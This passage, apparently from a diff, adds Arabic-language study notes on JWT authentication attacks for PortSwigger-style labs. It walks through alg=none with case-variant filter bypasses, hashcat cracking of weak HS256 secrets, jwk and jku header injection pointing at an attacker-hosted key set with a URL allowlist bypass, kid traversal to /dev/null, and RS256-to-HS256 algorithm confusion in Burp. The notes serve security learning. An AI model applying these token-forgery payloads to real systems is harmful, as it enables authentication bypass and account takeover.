+
+---
+
+# ثالثاً: يعني إيه JWT Attacks؟
+
+هو إنك **تعدل التوكن وتخدع السيرفر**.
+
+الهدف غالباً:
+
+- Login بدون باسورد
+- تحويل نفسك Admin
+- انتحال مستخدم تاني
+
+مثال:
+
+```
+{  "username": "carlos",  "isAdmin": false}
+```
+
+لو عدلتها:
+
+```
+{  "username": "administrator",  "isAdmin": true}
+```
+
+لو السيرفر ما تحققش من التوقيع صح → مبروك بقيت Admin 😎
+
+---
+
+# رابعاً: ليه الثغرات دي بتحصل؟
+
+المشكلة مش في JWT نفسه  
+المشكلة في **تنفيذ المطورين**.
+
+أشهر الأسباب:
+
+1️⃣ السيرفر ما بيتأكدش من التوقيع  
+2️⃣ استخدام secret key ضعيف  
+3️⃣ تسريب المفتاح  
+4️⃣ سوء استخدام المكتبات  
+5️⃣ الثقة في header بتاع المستخدم (خطأ قاتل)
+
+---
+
+# خامساً: أخطر خطأ — decode() بدل verify()
+
+في Node.js مثلاً:
+
+في مكتبة اسمها jsonwebtoken فيها دالتين:
+
+|function|وظيفتها|
+|---|---|
+|verify()|يفك التوكن + يتحقق من التوقيع|
+|decode()|يفك التوكن فقط ❌|
+
+بعض المطورين يعملوا:
+
+```
+jwt.decode(token)
+```
+
+بدل:
+
+```
+jwt.verify(token, secret)
+```
+
+يعني إيه؟  
+يعني السيرفر:
+
+- بيقرأ البيانات
+- ويصدقها بدون أي توقيع 😱
+
+وده معناه:
+
+&gt; أي حد يقدر يصنع توكن بنفسه ويعمل login.
+
+---
+
+# سادساً: ثغرة alg = none (أشهر هجوم JWT)
+
+خلينا نفهم الكارثة دي كويس.
+
+## Header فيه حاجة اسمها alg
+
+```
+{  "alg": "HS256"}
+```
+
+دي بتقول للسيرفر:
+
+&gt; استخدم HS256 عشان تتحقق من التوقيع.
+
+⚠️ المشكلة:  
+السيرفر بياخد قيمة alg من التوكن نفسه!  
+يعني من المستخدم 😬
+
+يعني المهاجم يقدر يقول للسيرفر:  
+"متتحققش من التوقيع"
+
+كيف؟ 👇
+
+---
+
+## Unsecured JWT
+
+ممكن تعمل توكن بدون توقيع:
+
+```
+{  "alg": "none"}
+```
+
+والتوكن يبقى شكله:
+
+```
+HEADER.PAYLOAD.
+```
+
+لاحظ:  
+في نقطة أخيرة بعد payload.
+
+يعني مفيش signature.
+
+لو السيرفر يقبل النوع ده → انتهى الموقع 🔥
+
+المهاجم يعمل:
+
+```
+{  "username": "administrator",  "isAdmin": true}
+```
+
+ويبعتها بدون توقيع.
+
+لو السيرفر وافق → دخلت كأدمن بدون باسورد.
+
+---
+
+## طيب ليه السيرفر يقبل ده أصلاً؟
+
+لأن بعض الفلاتر بتعمل:
+
+```
+if (alg == "none") reject
+```
+
+لكن المهاجم يعمل bypass:
+
+أمثلة:
+
+```
+NoneNONEnOnEnone%00
+```
+
+String parsing tricks 😈
+
+---
+
+# ملخص مهم جداً 🔥
+
+أخطر 3 أفكار في JWT attacks:
+
+1️⃣ السيرفر لا يخزن التوكن → يعتمد على التوقيع فقط  
+2️⃣ المستخدم يتحكم في Header → خطر جداً  
+3️⃣ أي خطأ في التحقق من التوقيع = اختراق كامل
+</code></pre>
+<hr />
+<h3 id="jwt-authentication-bypass-via-weak-signing-key">JWT authentication bypass via weak signing key:</h3>
+<p>[^2]</p>
+<p>[^2]: # أولاً: ليه أصلاً ينفع نعمل brute force على JWT؟</p>
+<pre><code>الهجوم ده يخص **خوارزميات HMAC** زي:
+
+```
+HS256HS384HS512
+```
+
+ودي بتستخدم حاجة اسمها:
+
+&gt; **Shared Secret Key**
+
+يعني مفتاح سري واحد موجود عند السيرفر فقط.
+
+التوقيع بيتعمل كده:
+
+```
+signature = HMAC(secret, header.payload)
+```
+
+يعني:
+
+- السيرفر عنده secret
+- يوقع التوكن بالمفتاح
+- أي توكن يرجعله → يعيد حساب التوقيع بالمفتاح ويقارنه.
+
+لو التوقيع صح → يثق في التوكن بالكامل.
+
+⚠️ هنا المشكلة الخطيرة:
+
+&gt; لو عرفنا الـ secret = نقدر نعمل توكنات صح 100%
+
+وده معناه:
+
+- نصنع توكن Admin
+- ندخل أي حساب
+- نغير أي claim
+- نكسر authentication بالكامل
+
+يعني حرفياً:  
+**Account takeover كامل للموقع.**
+
+---
+
+# ثانيًا: ليه الـ Secret بيتخمن أصلاً؟
+
+المطورين يعملوا أخطاء غبية جداً 😅
+
+أمثلة real world secrets:
+
+```
+secretpasswordjwtsecret123456secretkeymysecretchangeme
+```
+
+أحياناً كمان:
+
+- ينسوا يغيروا secret موجود في tutorial 😬
+- يسيبوا default secret من library 😬
+- يحطوا secret قصير جداً 😬
+
+المفروض secret يكون:
+
+- طويل جداً
+- عشوائي
+- مش كلمة dictionary
+
+لكن الواقع؟ 😏
+
+---
+
+# ثالثًا: فكرة الهجوم نفسها
+
+أنت عندك JWT صحيح من السيرفر:
+
+```
+header.payload.signature
+```
+
+أنت مش عارف secret.
+
+لكن تعرف حاجة مهمة:
+
+&gt; signature = HMAC(secret, header.payload)
+
+يبقى نعمل إيه؟
+
+نجرب secrets كتير من wordlist  
+ونشوف مين يطلع نفس التوقيع.
+
+لو واحد طلع نفس signature → لقينا المفتاح 🎉
+
+ده بالضبط زي brute force للباسورد.
+
+---
+
+# رابعًا: ليه الهجوم سريع جدًا؟
+
+نقطة مهمة جداً:
+
+الهجوم **Offline** مش Online.
+
+يعني:
+
+- مش بنبعت requests للسيرفر
+- مفيش rate limit
+- مفيش detection
+- مفيش logs
+
+كل الشغل بيحصل على جهازك.
+
+وده يخليه سريع جداً ⚡
+
+حتى ملايين المحاولات في ثواني.
+
+---
+
+# خامسًا: استخدام Hashcat
+
+أشهر أداة للهجوم ده = **hashcat**
+
+وده أقوى tool brute force في العالم تقريباً.
+
+## المطلوب:
+
+1️⃣ JWT صحيح من السيرفر  
+2️⃣ Wordlist secrets
+
+زي:
+
+- rockyou.txt
+- jwt-secrets.txt
+
+---
+
+## الأمر المستخدم
+
+```
+hashcat -a 0 -m 16500 &lt;jwt&gt; &lt;wordlist&gt;
+```
+
+نشرح كل حاجة:
+
+|جزء|معناه|
+|---|---|
+|hashcat|البرنامج|
+|-a 0|dictionary attack|
+|-m 16500|نوع الهاش = JWT HS256|
+|jwt|التوكن|
+|wordlist|قائمة secrets|
+
+---
+
+## Hashcat بيعمل إيه داخلياً؟
+
+لكل كلمة في wordlist:
+
+```
+test_secret -&gt; sign(header.payload)
+```
+
+ثم يقارن:
+
+```
+generated_signature == real_signature ?
+```
+
+لو حصل match:
+
+يظهر:
+
+```
+&lt;jwt&gt;:&lt;secret&gt;
+```
+
+يعني:  
+🎉 لقينا المفتاح السري.
+
+---
+
+# سادسًا: بعد ما نعرف الـ Secret… الكارثة تبدأ 😈
+
+دلوقتي بقى عندك المفتاح اللي السيرفر بيستخدمه.
+
+يبقى نعمل إيه؟
+
+نصنع JWT جديد:
+
+مثلاً نحول نفسنا Admin:
+
+```
+{  "username": "administrator",  "isAdmin": true}
+```
+
+نوقع التوكن بالمفتاح اللي لقيناه.
+
+السيرفر هيقول:  
+"Signature valid ✔"  
+"توكن سليم ✔"  
+"أهلاً يا أدمن 🤝"
+
+🔥🔥🔥
+
+---
+
+# ليه الهجوم ده High severity جدًا؟
+
+لأن تأثيره:
+
+|النتيجة|التأثير|
+|---|---|
+|Forged tokens|تزوير جلسات|
+|Privilege escalation|تحويل نفسك Admin|
+|Account takeover|انتحال أي مستخدم|
+|Authentication bypass|دخول بدون باسورد|
+
+يعني:
+
+&gt; انهيار كامل لنظام تسجيل الدخول.
+
+---
+
+# سابعًا: إمتى الهجوم ده ينجح؟
+
+يشتغل فقط لو:
+
+- الخوارزمية HS256 (shared secret)
+- secret ضعيف أو dictionary word
+
+لو الموقع يستخدم:
+
+```
+RS256
+```
+
+الهجوم ده ماينفعش (ده موضوع تاني اسمه key confusion).
+
+---
+
+# خلاصة الجزء ده 🔥
+
+لو الموقع:
+
+- يستخدم HS256
+- secret ضعيف
+
+يبقى المهاجم يقدر:  
+1️⃣ ياخد JWT واحد  
+2️⃣ يعمل brute force بالملايين  
+3️⃣ يلاقي secret  
+4️⃣ يصنع توكنات مزورة لأي مستخدم
+</code></pre>
+<hr />
+<h3 id="jwt-authentication-bypass-via-jwk-header-injection">JWT authentication bypass via jwk header injection :</h3>
+<p>[^3]</p>
+<p>[^3]: # الفكرة الأساسية</p>
+<pre><code>فاكر إن السيرفر لما يستلم JWT لازم يعرف:
+
+&gt; أستخدم أنهي مفتاح علشان أتحقق من التوقيع؟
+
+المفروض السيرفر يختار المفتاح من عنده هو.
+
+لكن بعض السيرفرات الغلط ❌ بتعمل حاجة خطيرة جداً:  
+بتثق في معلومات جاية **من داخل التوكن نفسه** 🤦‍♂️
+
+يعني التوكن يقول للسيرفر:
+
+&gt; استخدم المفتاح ده للتحقق مني.
+
+لو السيرفر صدق الكلام ده… خلاص احنا كسبنا 🎉
+
+---
+
+# أهم 3 parameters في الـ Header
+
+دول اللي بنهاجمهم:
+
+|parameter|وظيفته|
+|---|---|
+|jwk|التوكن يبعث المفتاح جوّه نفسه|
+|jku|التوكن يقول للسيرفر يجيب المفتاح من URL|
+|kid|التوكن يحدد اسم المفتاح|
+
+كلهم هدفهم واحد:  
+👉 إجبار السيرفر يستخدم **مفتاح إحنا اخترناه**.
+
+وأخطرهم في اللابات: **jwk injection**
+
+---
+
+# يعني ايه jwk ؟
+
+## JWK = JSON Web Key
+
+ده فورمات لتمثيل المفتاح كـ JSON.
+
+شكل المفتاح العام RSA بيكون كده:
+
+```
+{  "kty": "RSA",  "e": "AQAB",  "n": "base64_modulus"}
+```
+
+ده Public Key.
+
+فاكر RSA؟
+
+- Private key → نوقّع بيه
+- Public key → السيرفر يحقق بيه
+
+---
+
+# الثغرة بتحصل ازاي؟
+
+السيرفر المفروض:
+
+- عنده Public key محفوظ عنده
+- يستخدمه للتحقق من التوقيع
+
+لكن السيرفر الضعيف يعمل كده:
+
+1. يشوف jwk في الهيدر
+2. يقول:  
+    "أوه التوكن جاب المفتاح معاه… خلاص استخدمه"
+
+💀💀💀
+
+يعني إحنا نقدر نقوله:
+
+&gt; استخدم مفتاحي أنا.
+
+---
+
+# السيناريو الكامل للهجوم
+
+بدل ما نكسر secret…  
+هنعمل مفتاح جديد خاص بينا 😈
+
+الهجوم اسمه:  
+**Self-Signed JWT**
+
+---
+
+# فكرة الهجوم ببساطة جداً
+
+بدل:
+
+```
+Server signs tokenServer verifies token
+```
+
+نخليها:
+
+```
+Attacker signs tokenServer verifies token باستخدام مفتاح المهاجم 😈
+```
+
+---
+
+# خطوات الهجوم عملي في Burp
+
+ركز دي مهمة جداً.
+
+---
+
+## 1️⃣ توليد RSA key جديد
+
+روح:
+
+```
+JWT Editor → Keys
+```
+
+اضغط:
+
+```
+New RSA Key
+```
+
+اضغط Generate وخلاص.
+
+دلوقتي معاك:
+
+- Public key
+- Private key
+
+المفتاح ده بتاعك انت.
+
+---
+
+## 2️⃣ افتح التوكن في Repeater
+
+زي ما عملنا قبل كده.
+
+افتح تبويب:
+
+```
+JSON Web Token
+```
+
+---
+
+## 3️⃣ عدّل الـ Payload
+
+مثلاً:
+
+```
+{  "sub": "administrator"}
+```
+
+أو:
+
+```
+{  "username": "administrator"}
+```
+
+حسب اللاب.
+
+---
+
+## 4️⃣ نفذ الهجوم جاهز من Burp
+
+اضغط:
+
+```
+Attack → Embedded JWK
+```
+
+اختار RSA key اللي عملته.
+
+Burp هيعمل تلقائي:
+
+✔ يضيف jwk في header  
+✔ يضيف kid مطابق  
+✔ يوقّع التوكن بالـ private key بتاعك  
+✔ يبني JWT كامل جاهز
+
+دي أهم خطوة في الهجوم كله.
+
+---
+
+# شكل الهيدر بعد الهجوم
+
+هيبقى فيه jwk كده:
+
+```
+{  "alg": "RS256",  "jwk": { public key بتاعك هنا }}
+```
+
+يعني التوكن بيقول للسيرفر:
+
+&gt; استخدم المفتاح ده للتحقق مني.
+
+لو السيرفر vulnerable:  
+هيصدق فوراً 😨
+
+---
+
+# 5️⃣ ابعت الريكوست
+
+لو السيرفر vulnerable:  
+هتدخل Admin مباشرة.
+
+من غير ما تعرف secret  
+من غير brute force  
+من غير أي حاجة
+
+🔥🔥🔥
+
+---
+
+# ليه الهجوم ده قوي جداً؟
+
+لأننا:
+
+- مش محتاجين مفتاح السيرفر
+- مش محتاجين نكسر حاجة
+- بنخلي السيرفر يستخدم مفتاحنا 😈
+
+ده اسمه:  
+**Trusting user-controlled keys**
+
+وهي من أخطر أخطاء JWT.
+
+---
+
+# ملخص سريع
+
+|المرحلة|اللي بيحصل|
+|---|---|
+|Generate RSA key|نعمل مفتاح خاص بينا|
+|Modify payload|نخلي نفسنا admin|
+|Embedded JWK|نحط public key في التوكن|
+|Sign بالـ private key|نوقّع بنفسنا|
+|Server verifies|يستخدم مفتاحنا بالغلط|
+
+💀 Authentication bypass كامل.
+</code></pre>
+<hr />
+<h3 id="jwt-authentication-bypass-via-jku-header-injection">JWT authentication bypass via jku header injection :</h3>
+<p>[^4]</p>
+<p>[^4]: ## الفكرة الأساسية</p>
+<pre><code>السيرفر لما يشوف JWT فيه Header فيه `jku` بيعمل الآتي:
+
+1️⃣ يقرأ قيمة `jku`  
+2️⃣ يروح يعمل **HTTP request** للـ URL ده  
+3️⃣ يجيب منه **JWK Set (public keys)**  
+4️⃣ يستخدم المفتاح المناسب (عن طريق `kid`) علشان يتحقق من توقيع التوكن
+
+يعني السيرفر بيقول:
+
+&gt; “هاتلي المفتاح العام من اللينك ده وأنا هتحقق من التوقيع.”
+
+المشكلة؟ 🤦‍♂️  
+الـ URL نفسه **جاي من التوكن اللي المستخدم بعته**.
+
+يعني لو السيرفر مش عامل allowlist صح… انت تقدر تخليه يجيب المفتاح من عندك أنت 😈
+
+---
+
+## سيناريو الهجوم ببساطة
+
+بدل ما السيرفر يجيب المفتاح من:
+
+```
+https://victim.com/.well-known/jwks.json
+```
+
+نخليه يجيب المفتاح من:
+
+```
+https://attacker.com/jwks.json
+```
+
+وبالتالي:
+
+- انت تعمل مفتاح RSA بنفسك
+- توقّع التوكن بالمفتاح الخاص
+- تحط public key بتاعك في jwks.json
+- السيرفر يجيب المفتاح منك ويقول:  
+    “آه التوقيع صحيح” ✔️
+
+وبكده التوكن المزور يبقى trusted.
+
+---
+
+## خطوات التنفيذ (مفهومياً)
+
+### 1️⃣ توليد RSA key pair
+
+- Private key → للتوقيع
+- Public key → نحطه في JWK Set
+
+---
+
+### 2️⃣ تحويل الـ Public Key إلى JWK
+
+شكل JWK بيكون كده:
+
+```
+{  "kty": "RSA",  "e": "AQAB",  "kid": "attacker-key",  "n": "base64url modulus"}
+```
+
+ونحطه داخل JWK Set:
+
+```
+{  "keys":[    {      "kty":"RSA",      "e":"AQAB",      "kid":"attacker-key",      "n":"XXXX"    }  ]}
+```
+
+---
+
+### 3️⃣ استضافة jwks.json
+
+ترفع الملف على سيرفر بتاعك مثلاً:
+
+```
+http://YOUR-SERVER/jwks.json
+```
+
+مهم جداً يكون accessible بدون auth.
+
+---
+
+### 4️⃣ تعديل JWT Header
+
+نضيف:
+
+```
+{  "alg": "RS256",  "jku": "http://YOUR-SERVER/jwks.json",  "kid": "attacker-key"}
+```
+
+لاحظ العلاقة:
+
+- `jku` → فين السيرفر يجيب المفتاح
+- `kid` → أي مفتاح داخل الـ keys يستخدم
+
+---
+
+### 5️⃣ تعديل الـ payload (مثلاً admin)
+
+```
+{  "sub":"administrator"}
+```
+
+---
+
+### 6️⃣ توقيع التوكن بالـ private key بتاعك
+
+وده أهم خطوة:  
+السيرفر هيستخدم **public key بتاعك** علشان يتحقق → فالتوقيع لازم يكون بالمفتاح الخاص المقابل.
+
+---
+
+## ليه الهجوم ينجح؟
+
+لأن السيرفر عمل 3 أخطاء:
+
+1️⃣ وثق في header جاي من المستخدم  
+2️⃣ سمح بجلب مفاتيح من أي URL  
+3️⃣ ماعملش allowlist للـ domain
+
+وده نوع من:
+
+- JWT Misconfiguration
+- - SSRF-like behavior
+
+---
+
+## ملاحظات مهمة للـ labs
+
+غالباً PortSwigger labs بيكون فيها:
+
+- Filter بسيط للـ domain
+- وتحتاج bypass بسيط للـ URL  
+    زي:
+
+```
+http://trusted.com@attacker.com/jwks.json
+```
+
+أو redirect.
+</code></pre>
+<hr />
+<h3 id="injecting-self-signed-jwts-via-the-kid-parameter">Injecting self-signed JWTs via the kid parameter :</h3>
+<p>[^5]</p>
+<p>[^5]: # فكرة الهجوم ببساطة</p>
+<pre><code>السيرفر بيستخدم `kid` عشان يعرف **يجيب مفتاح التحقق منين**.
+
+بدل ما يكون:
+
+```
+kid = key1kid = key2
+```
+
+بعض السيرفرات الغلط تعمل حاجة زي:
+
+```
+readFile("/keys/" + kid)
+```
+
+فإنت كمهاجم تقدر تقول له:
+
+```
+اقرأ أي فايل من السيستم 😈
+```
+
+وده اسمه:
+
+```
+Directory Traversal via kid
+```
+
+---
+
+# ليه /dev/null تحديداً ؟
+
+في لينكس فيه فايل اسمه:
+
+```
+/dev/null
+```
+
+ده فايل فاضي بيرجع **empty string**.
+
+لو السيرفر استخدمه كمفتاح:  
+يبقى secret = "" (فاضي)
+
+وده معناه إنك تقدر توقّع JWT بـ **secret فاضي** ويقبلوه 😳
+
+---
+
+# سيناريو الهجوم كامل
+
+السيرفر:
+
+- يقبل HS256 (symmetric)
+- يستخدم kid يقرأ فايل كمفتاح
+
+يبقى نعمل JWT جديد كده 👇
+
+---
+
+## 1️⃣ نغير الـ Algorithm
+
+لازم يكون:
+
+```
+"alg": "HS256"
+```
+
+مش RS256 المرة دي ⚠️
+
+---
+
+## 2️⃣ نغير الـ kid
+
+نحطه:
+
+```
+"kid": "../../../../../../dev/null"
+```
+
+أحياناً يكفي:
+
+```
+"kid": "/dev/null"
+```
+
+حسب الفلترة.
+
+---
+
+## 3️⃣ نعمل Sign ب secret فاضي
+
+في Burp:
+
+JWT Editor → Keys → New Symmetric Key
+
+اختار:
+
+```
+Specify secret → سيبه فاضي
+```
+
+يعني ما تكتبش حاجة.
+
+اضغط Generate → OK
+
+---
+
+## 4️⃣ نوقّع التوكن
+
+اضغط Sign واختار:
+
+Algorithm:
+
+```
+HS256
+```
+
+Signing key:
+
+```
+(empty key)
+```
+
+Header options:
+
+```
+✔ kid❌ jwk❌ jku
+```
+
+بس كده.
+
+---
+
+## 5️⃣ عدل الـ payload
+
+حط:
+
+```
+"sub": "administrator"
+```
+
+---
+
+## 6️⃣ ابعت التوكن 🚀
+
+لو اللاب vulnerable هتدخل admin مباشرة.
+
+---
+
+# ليه الهجوم ده بيشتغل؟
+
+السيرفر يعمل كده:
+
+```
+secret = readFile(kid)verify(signature, secret)
+```
+
+kid = /dev/null  
+→ secret = ""  
+→ انت وقعت ب secret = ""  
+→ signature صحيح ✔️
+</code></pre>
+<hr />
+<h3 id="algorithm-confusion-attacks">Algorithm confusion attacks :</h3>
+<p>[^6]</p>
+<p>[^6]: # أولاً: لازم نفهم التوقيع في JWT بيشتغل إزاي</p>
+<pre><code>أي JWT =
+
+```
+HEADER.PAYLOAD.SIGNATURE
+```
+
+التوقيع بيتعمل على:
+
+```
+base64(header) + "." + base64(payload)
+```
+
+وبعدين يتعمل Sign باستخدام **Algorithm + Key**
+
+المشكلة كلها هنا 👇  
+**Algorithm + Key**
+
+---
+
+# ثانياً: أنواع Algorithms في JWT
+
+في نوعين مهمين جداً:
+
+## 1️⃣ Symmetric algorithms (زي HS256)
+
+اسمها symmetric لأن:
+
+نفس المفتاح يستخدم:
+
+- للتوقيع
+- للتحقق
+
+يعني:
+
+```
+secret = "supersecret"
+```
+
+السيرفر:
+
+```
+signature = HMAC(secret, data)verify = HMAC(secret, data)
+```
+
+لو عرفت الـ secret → انتهى النظام.
+
+---
+
+## 2️⃣ Asymmetric algorithms (زي RS256)
+
+دي أهم نقطة في الهجوم.
+
+RSA بيستخدم مفتاحين:
+
+|النوع|الاستخدام|
+|---|---|
+|Private key 🔐|التوقيع|
+|Public key 🔓|التحقق|
+
+السيرفر:
+
+```
+sign باستخدام private keyverify باستخدام public key
+```
+
+والـ public key ممكن يبقى public عادي.
+
+وده آمن جداً.
+
+---
+
+# ثالثاً: فين الغلطة اللي بتسبب الهجوم؟
+
+الغلطة مش في JWT…  
+الغلطة في **طريقة كتابة الكود**.
+
+المبرمج يكتب كود كده:
+
+```
+verify(token, key)
+```
+
+لكن ما يعملش Check مهم جداً:
+
+❌ لا يتحقق إن algorithm ثابت.
+
+السيرفر يقرأ algorithm من التوكن نفسه 😨
+
+---
+
+# رابعاً: الهيدر خطر جداً
+
+الهيدر موجود جوه التوكن:
+
+```
+{  "alg": "RS256"}
+```
+
+السيرفر بيعمل:
+
+```
+اقرأ alg من التوكنواستخدمه للتحقق
+```
+
+بس التوكن جاي من المستخدم 🤦‍♂️  
+يعني **المهاجم يحدد طريقة التحقق بنفسه**.
+
+وهنا اسم الهجوم:
+
+# 🔥 Algorithm Confusion
+
+يعني: تخلي السيرفر يخلط بين نوعين algorithms.
+
+---
+
+# خامساً: الفكرة الأساسية للهجوم
+
+السيرفر أصلاً بيستخدم:
+
+```
+RS256
+```
+
+يعني:
+
+```
+لديه Public key
+```
+
+والمفروض:
+
+- Private key للتوقيع
+- Public key للتحقق
+
+مفيش مشكلة لحد هنا.
+
+---
+
+# سادساً: نقطة الضعف الذكية جداً
+
+السيرفر لما يجي يتحقق يعمل:
+
+```
+if alg == HS256 → استخدم KEYif alg == RS256 → استخدم KEY
+```
+
+والمصيبة إن:
+
+```
+KEY = public key
+```
+
+يعني نفس المتغير مستخدم في الحالتين 😭
+
+---
+
+# سابعاً: هنا يبدأ الهجوم الحقيقي
+
+نحن كمهاجمين عندنا:
+
+```
+public key
+```
+
+وده طبيعي لأنه public.
+
+طيب HS256 محتاج إيه؟
+
+```
+secret string
+```
+
+هل ينفع public key يبقى string؟  
+ايوه 😈
+
+يبقى نستخدم:
+
+```
+public key = secret
+```
+
+---
+
+# ثامناً: خطوات الهجوم نظرياً
+
+## الخطوة 1️⃣
+
+نأخذ JWT أصلي من الموقع.
+
+الهيدر يكون:
+
+```
+"alg": "RS256"
+```
+
+---
+
+## الخطوة 2️⃣
+
+نغيّر الهيدر إلى:
+
+```
+"alg": "HS256"
+```
+
+نحن كده بنضحك على السيرفر ونقوله:
+
+&gt; التوكن ده معمول بـ HMAC مش RSA.
+
+---
+
+## الخطوة 3️⃣
+
+نعدل الـ payload زي ما نحب 😈
+
+مثلاً:
+
+```
+"isAdmin": true
+```
+
+---
+
+## الخطوة 4️⃣ أهم خطوة 🔥
+
+نوقّع التوكن باستخدام:
+
+```
+HS256secret = PUBLIC KEY
+```
+
+يعني نستخدم المفتاح العام كأنه باسورد.
+
+---
+
+## الخطوة 5️⃣
+
+السيرفر يستقبل التوكن ويعمل verify:
+
+يشوف:
+
+```
+alg = HS256
+```
+
+فيقول:
+
+```
+تمام هستخدم KEY كـ secret
+```
+
+و KEY = public key 😭
+
+فيحسب التوقيع → يطلع صحيح ✔️
+
+ويقول:
+
+```
+التوكن صحيح!
+```
+
+رغم إنك مزوره بالكامل 🤯
+
+---
+
+# ليه الهجوم ينجح؟
+
+السيرفر كان مفروض يعمل:
+
+```
+لو alg != RS256 → ارفض
+```
+
+لكن بدلاً من ذلك:
+
+```
+وثق في alg من التوكن
+```
+
+وده user input.
+
+دي أكبر غلطة.
+
+---
+
+# تلخيص سريع جداً
+
+|السيرفر فاكر|اللي حصل فعلاً|
+|---|---|
+|verify RSA|verify HMAC|
+|public key للتحقق|public key كـ secret|
+|توكن حقيقي|توكن مزور|
+
+---
+
+# جملة تحفظها ❤️
+
+**Algorithm Confusion = استخدام Public Key كأنه Secret Key**
+
+لو فهمت الجملة دي يبقى فهمت الهجوم كله.
+</code></pre>
+<hr />
+<h3 id="how-do-algorithm-confusion-vulnerabilities-arise">How do algorithm confusion vulnerabilities arise ?</h3>
+<p>[^7]</p>
+<p>[^7]: # الفكرة الأساسية قبل التنفيذ</p>
+<pre><code>السيرفر:
+
+- بيستخدم **RS256**
+- عنده **Public Key** متاح للناس
+- المفروض يستخدمه فقط للتحقق
+
+إحنا:
+
+- هنستخدم الـ Public Key نفسه كأنه Secret
+- ونوقع التوكن بـ **HS256**
+
+وده يحصل بسبب غلطة في كود التحقق.
+
+---
+
+# ليه الثغرة بتحصل أصلاً؟
+
+المكتبات بتوفر function واحدة اسمها verify()
+
+شوف الكود الوهمي ده 👇
+
+```
+function verify(token, secretOrPublicKey){    algorithm = token.getAlgHeader();    if(algorithm == "RS256"){        use key as PUBLIC KEY    }    else if(algorithm == "HS256"){        use key as SECRET    }}
+```
+
+المبرمج عمل الغلطة القاتلة:
+
+```
+verify(token, publicKey)
+```
+
+هو فاكر إن التوكن هيبقى RS256 بس 😅
+
+لكن المهاجم يقدر يغير alg = HS256.
+
+فالمكتبة تقول:
+
+&gt; آه HS256؟ يبقى المفتاح ده secret.
+
+وبكده استخدمنا الـ public key كـ secret.
+
+---
+
+# دلوقتي ندخل في تنفيذ الهجوم نفسه
+
+الهجوم له 4 مراحل رئيسية.
+
+---
+
+# STEP 1 — الحصول على الـ Public Key
+
+السيرفر غالباً بيعرضه هنا:
+
+```
+/jwks.json/.well-known/jwks.json
+```
+
+بيكون بالشكل ده:
+
+```
+{  "kty": "RSA",  "e": "AQAB",  "n": "...."}
+```
+
+ده اسمه **JWK**.
+
+وده Public key بصيغة JSON.
+
+ممتاز 👍
+
+---
+
+# STEP 2 — تحويل الـ Public Key للصيغة المناسبة
+
+دي خطوة ناس كتير بتتلخبط فيها.
+
+السيرفر لما يتحقق من التوقيع بيستخدم المفتاح من:
+
+- File system
+- أو Database
+
+وغالباً بيكون بصيغة:
+
+```
+PEM format
+```
+
+زي كده:
+
+```
+-----BEGIN PUBLIC KEY-----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A...-----END PUBLIC KEY-----
+```
+
+⚠️ لازم المفتاح اللي هنستخدمه يكون **نفسه بالظبط byte by byte**.
+
+ليه؟  
+لأن HS256 بيحسب HMAC على كل byte.
+
+لو حرف واحد مختلف → التوقيع يفشل.
+
+---
+
+## تحويل JWK → PEM في Burp
+
+الفكرة ببساطة:
+
+1️⃣ تحط JWK  
+2️⃣ Burp يطلعلك PEM  
+3️⃣ تعمل Base64 للـ PEM  
+4️⃣ تستخدمه كـ secret
+
+ليه Base64؟  
+لأن symmetric keys في Burp بتتخزن Base64.
+
+---
+
+# STEP 3 — تعديل التوكن
+
+نعدل التوكن زي ما نحب 😈
+
+مثلاً:
+
+### header القديم
+
+```
+{  "alg": "RS256"}
+```
+
+### نغيره إلى
+
+```
+{  "alg": "HS256"}
+```
+
+دي أهم خطوة في الهجوم كله.
+
+---
+
+### نعدل الـ payload
+
+مثلاً:
+
+```
+{  "sub": "administrator",  "isAdmin": true}
+```
+
+دلوقتي التوكن مزور بالكامل.
+
+بس ناقص التوقيع.
+
+---
+
+# STEP 4 — توقيع التوكن باستخدام Public Key 😈
+
+نوقع التوكن باستخدام:
+
+```
+Algorithm = HS256Secret = RSA PUBLIC KEY
+```
+
+دي اللحظة السحرية في الهجوم ✨
+
+---
+
+# ماذا يحدث داخل السيرفر الآن؟
+
+السيرفر يستقبل التوكن.
+
+يشوف:
+
+```
+alg = HS256
+```
+
+فيقول:
+
+&gt; تمام هنستخدم المفتاح للتحقق باستخدام HMAC.
+
+ويستخدم:
+
+```
+publicKey
+```
+
+لحساب HMAC.
+
+لكن إحنا عملنا نفس العملية بالضبط 😎
+
+فتكون النتيجة:
+
+```
+Signature Valid ✔️
+```
+
+رغم إننا مزورين التوكن بالكامل.
+
+---
+
+# لماذا لازم يكون المفتاح identical؟
+
+لأن HMAC يعمل على:
+
+```
+bytes
+```
+
+مش على النص.
+
+يعني حتى:
+
+- newline
+- spaces
+- encoding
+
+كل ده لازم يكون مطابق.
+
+عشان كده أحياناً تحتاج تجرب أكثر من format.
+
+وده سبب إن اللاب ساعات يفشل أول مرة.
+
+---
+
+# ملخص التنفيذ السريع جداً
+
+1️⃣ خذ Public Key  
+2️⃣ حوله PEM  
+3️⃣ اعمل Base64 للـ PEM  
+4️⃣ غير alg → HS256  
+5️⃣ عدل payload  
+6️⃣ Sign باستخدام public key كـ secret  
+7️⃣ Send → Admin access 🎉
+</code></pre>
+<hr />
+<h2 id="lab-algorithm-confusion-attack-rs256-hs256">Lab: Algorithm Confusion Attack (RS256 → HS256) :</h2>
+<h3 id="_17">الفكرة الأساسية</h3>
+<p>السيرفر بيستخدم:</p>
+<pre><code>&quot;alg&quot;:&quot;RS256&quot;
+</code></pre>
+<p>يعني:</p>
+<ul>
+<li>يوقّع بالـ private key</li>
+<li>ويتحقق بالـ public key</li>
+</ul>
+<p>لكن بسبب Vulnerability:<br />
+لو غيرت:</p>
+<pre><code>&quot;alg&quot;:&quot;HS256&quot;
+</code></pre>
+<p>السيرفر هيستخدم الـ public key كأنه HMAC secret.</p>
+<p>فإحنا نستغل ده ونوقّع التوكن بالـ public key.</p>
+<hr />
+<h1 id="_18">خطوات الحل</h1>
+<h2 id="1-public-key">1) هات الـ Public Key</h2>
+<p>ادخل على:</p>
+<pre><code>/jwks.json
+</code></pre>
+<p>هتلاقي:</p>
+<pre><code>{  &quot;keys&quot;:[    {      &quot;kty&quot;:&quot;RSA&quot;,      &quot;e&quot;:&quot;AQAB&quot;,      &quot;n&quot;:&quot;...&quot;    }  ]}
+</code></pre>
+<p>انسخ الـ JWK object.</p>
+<hr />
+<h1 id="2-rsa-key-jwk">2) اعمل RSA Key من الـ JWK</h1>
+<p>في Burp:</p>
+<pre><code>JWT Editor Keys→ New RSA Key
+</code></pre>
+<p>اختار:</p>
+<pre><code>JWK
